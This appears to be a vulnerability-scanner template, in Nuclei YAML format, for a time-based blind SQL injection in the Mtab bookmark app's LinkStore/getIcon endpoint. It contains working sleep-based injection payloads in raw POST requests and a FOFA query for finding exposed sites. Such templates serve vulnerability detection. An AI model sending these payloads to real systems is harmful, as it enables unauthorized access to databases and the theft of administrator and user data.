http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /LinkStore/getIcon HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
          Content-Type: application/json

          {"url":"'XOR(if(now()=sysdate(),sleep(4),0))XOR'"}
        - |
          POST /LinkStore/getIcon HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
          Content-Type: application/json

          {"url":"'XOR(if(now()=sysdate(),sleep(8),0))XOR'"}
id: Mtab-LinkStore_getIcon-sql
info:
    author: Superhero
    description: |-
        fofa: title="Mtab书签"
        Mtab书签导航程序 LinkStore/getIcon 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: Mtab书签导航程序 LinkStore/getIcon SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486258&idx=1&sn=d6f5aedad1bcc39c4cd0879e08d58898&chksm=c267be01f5103717b3cec252ed579ab7923a35f3eb2ab50afa5987cc3670c6871ff9050f92b7&token=1742030890&lang=zh_CN#rd
    severity: high
    tags: []
